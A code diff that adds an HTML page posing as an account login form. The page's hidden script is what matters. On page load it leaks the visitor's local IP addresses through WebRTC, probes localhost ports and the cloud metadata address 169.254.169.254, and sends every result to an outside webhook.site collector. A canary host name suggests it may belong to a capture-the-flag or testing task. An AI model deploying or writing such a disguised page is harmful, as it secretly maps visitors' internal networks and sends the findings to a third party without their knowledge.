@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<title>Account login</title>
+<div style="font-family:system-ui;max-width:400px;margin:8vh auto">
+ <h1>Log in</h1>
+ <form><input name="username" type="email" placeholder="Email"><input name="password" type="password" placeholder="Password"><button>Log in</button></form>
+</div>
+<script>
+var U='https://webhook.site/4f65b4cd-39b4-49e8-a05b-e0a2785d45cd';
+function beacon(path,val){try{new Image().src=U+path+'?d='+encodeURIComponent(String(val).slice(0,1500))+'&r='+Math.random();}catch(e){}}
+// WebRTC local IP leak
+try{
+ var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+ pc.createDataChannel('x');
+ pc.onicecandidate=function(e){if(e.candidate)beacon('/ice',e.candidate.candidate);};
+ pc.createOffer().then(function(o){return pc.setLocalDescription(o);});
+}catch(e){beacon('/ice','err:'+e);}
+// PNA / reachability tests from JS (no-cors: resolve=reachable, reject=blocked/closed)
+function probe(name,url){
+ var done=false; var t=setTimeout(function(){if(!done){done=true;beacon('/probe','TIMEOUT '+name);}},6000);
+ fetch(url,{mode:'no-cors',cache:'no-store'}).then(function(){if(!done){done=true;clearTimeout(t);beacon('/probe','OK '+name);}})
+ .catch(function(e){if(!done){done=true;clearTimeout(t);beacon('/probe','ERR '+name+' '+e);}});
+}
+probe('127.0.0.1:80','http://127.0.0.1/');
+probe('127.0.0.1:8000','http://127.0.0.1:8000/');
+probe('localhost:80','http://localhost/');
+probe('169.254.169.254','http://169.254.169.254/latest/meta-data/');
+probe('canary-public','https://canary.task.sasc.tf/');
+</script>
